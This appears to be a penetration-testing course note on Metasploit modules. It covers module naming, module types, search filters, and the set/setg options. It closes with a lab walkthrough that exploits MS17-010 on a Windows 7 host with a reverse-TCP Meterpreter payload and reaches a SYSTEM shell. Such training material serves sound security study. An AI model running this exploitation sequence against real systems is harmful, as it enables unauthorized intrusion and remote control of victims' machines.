# 04 — Modules

## Overview

Metasploit modules are prepared scripts with specific purposes and functions that have been developed and tested in the wild. This section covers module structure, types, searching, selecting, configuring, and executing modules.

> **Important:** A failed exploit does NOT disprove a vulnerability exists — it only proves that specific Metasploit module didn't work. Many exploits require customization for the target. MSF is a **support tool**, not a substitute for manual skills.

---

## Module Naming Syntax

```
<No.>  <type>/<os>/<service>/<name>
```

### Example

```
794  exploit/windows/ftp/scriptftp_list
```

| Component | Description | Example |
|-----------|-------------|---------|
| **No.** | Index number for quick selection during searches | `794` |
| **Type** | What the module does (exploit, auxiliary, post, etc.) | `exploit` |
| **OS** | Target operating system and architecture | `windows` |
| **Service** | Vulnerable service (or general activity like `gather`) | `ftp` |
| **Name** | Specific action the module performs | `scriptftp_list` |

---

## Module Types

### All Module Types

| Type | Description |
|------|-------------|
| **Auxiliary** | Scanning, fuzzing, sniffing, and admin capabilities. Extra assistance and functionality |
| **Encoders** | Ensure payloads arrive intact at their destination |
| **Exploits** | Exploit a vulnerability to allow payload delivery |
| **NOPs** | No Operation code — keep payload sizes consistent across exploit attempts |
| **Payloads** | Code that runs remotely and calls back to establish a connection (shell) |
| **Plugins** | Additional scripts integrated within msfconsole for extra functionality |
| **Post** | Post-exploitation modules for gathering information, pivoting deeper, etc. |

### Interactable Modules (usable with `use` command)

| Type | Description |
|------|-------------|
| **Auxiliary** | Scanning, fuzzing, sniffing, admin capabilities |
| **Exploits** | Exploit vulnerabilities for payload delivery |
| **Post** | Post-exploitation information gathering, pivoting |

> Only these three types can be selected with the `use <no.>` command as initiators.

---

## Searching for Modules

### Search Help

```bash
msf6 > help search
```

### Search Keywords

| Keyword | Purpose | Example |
|---------|---------|---------|
| `type` | Module type | `type:exploit` |
| `platform` | Target OS | `platform:windows` |
| `cve` | CVE ID/year | `cve:2021` |
| `name` | Descriptive name | `name:eternalblue` |
| `rank` | Exploitability rank | `rank:excellent` |
| `author` | Module author | `author:sleepya` |
| `port` | Matching port | `port:445` |
| `edb` | Exploit-DB ID | `edb:50064` |
| `check` | Supports check method | `check:yes` |
| `date` | Disclosure date | `date:2017` |
| `path` | Module path | `path:smb` |
| `ref` | Matching reference | `ref:MS17-010` |

### Search Options

| Option | Purpose |
|--------|---------|
| `-S <string>` | Regex pattern to filter results |
| `-u` | Auto-use module if only one result |
| `-s <column>` | Sort results by column (rank, date, name, type) |
| `-r` | Reverse sort order (descending) |
| `-o <file>` | Output results to CSV file |

### Search Examples

```bash
# Basic search
msf6 > search eternalromance

# Filter by type
msf6 > search eternalromance type:exploit

# Complex search with multiple filters
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

# Exclude results (prepend with -)
msf6 > search cve:2009 type:exploit platform:-linux
```

---

## Selecting and Using Modules

### Select by Index Number

```bash
msf6 > search ms17_010
# Returns numbered results

msf6 > use 0
# Selects module #0 from search results — no need to type the full path
```

### Select by Full Path

```bash
msf6 > use exploit/windows/smb/ms17_010_psexec
```

### View Module Info

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > info
```

This shows:
- Name, platform, architecture, rank
- Authors and disclosure date
- Available targets
- Basic options
- Full description
- CVE references and aliases

---

## Configuring Module Options

### View Options

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

> Everything with `Yes` in the **Required** column must be set before running the exploit.

### Setting Options

| Command | Scope | Description |
|---------|-------|-------------|
| `set RHOSTS 10.10.10.40` | Current module only | Set target host for this session |
| `setg RHOSTS 10.10.10.40` | **Global (persistent)** | Persists across module changes until msfconsole restarts |
| `set LHOST 10.10.14.15` | Current module only | Set your listener/callback IP |
| `setg LHOST 10.10.14.15` | **Global (persistent)** | Your IP stays set when switching modules |

### Common Required Options

| Option | Description | Example |
|--------|-------------|---------|
| **RHOSTS** | Target host(s) IP | `10.10.10.40` |
| **RPORT** | Target service port | `445` |
| **LHOST** | Your IP (for reverse shells) | `10.10.14.15` |
| **LPORT** | Your listener port | `4444` |

---

## Full Exploitation Workflow Example

### Scenario: MS17-010 EternalRomance against Windows 7 SMB

```bash
# 1. Nmap scan reveals SMB on port 445, Windows 7
nmap -sV 10.10.10.40

# 2. Search for the exploit
msf6 > search ms17_010

# 3. Select the module by index
msf6 > use 2

# 4. View options
msf6 exploit(windows/smb/ms17_010_psexec) > options

# 5. Set target
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40

# 6. Set listener IP (global so it persists)
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15

# 7. Run the exploit (default payload is sufficient: windows/meterpreter/reverse_tcp)
msf6 exploit(windows/smb/ms17_010_psexec) > run

# 8. Get shell
meterpreter > shell
C:\Windows\system32> whoami
nt authority\system
```

### What Happened Behind the Scenes

```
1. MSF ran auxiliary/scanner/smb/smb_ms17_010 as a check → Host is VULNERABLE
2. Connected to target for exploitation
3. Validated OS via SMB reply and DCE/RPC
4. Sent exploit packet fragments (pool grooming technique)
5. ETERNALBLUE overwrite completed
6. Payload delivered → Meterpreter session opened
7. Dropped to system shell → NT AUTHORITY\SYSTEM
```

---

## Key Takeaways

| Concept | Remember |
|---------|----------|
| **Module path format** | `type/os/service/name` |
| **Use index numbers** | `use 0` is faster than typing the full path |
| **`set` vs `setg`** | `set` = current module only, `setg` = global/persistent until restart |
| **Check Required fields** | `options` shows what must be set — look for `Yes` in Required column |
| **`info` is your friend** | Shows description, CVEs, targets, authors — read it before running |
| **Failed exploit ≠ no vulnerability** | The module may need customization; the vuln may still exist |
| **Default payloads work** | Often you don't need to change the payload — the default is sufficient |
| **Nmap first, MSF second** | Always enumerate with nmap to identify services/versions before searching for modules |
